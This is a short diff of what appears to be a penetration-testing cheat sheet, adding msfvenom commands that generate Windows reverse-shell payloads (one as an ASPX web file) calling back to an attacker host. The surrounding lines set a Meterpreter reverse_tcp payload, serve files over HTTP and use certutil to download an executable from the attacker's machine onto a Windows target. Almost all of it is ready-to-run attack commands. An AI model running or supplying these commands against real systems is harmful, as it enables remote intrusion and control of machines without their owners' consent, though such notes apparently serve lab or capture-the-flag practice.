@@ -12,6 +12,11 @@ set payload windows/meterpreter/reverse_tcp
 ```
 python3 -m http.server
 
+#to get reverse shell from your kali
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 
+
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 
+
 cd C:\Windows\Temp
 certutil --urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 ```
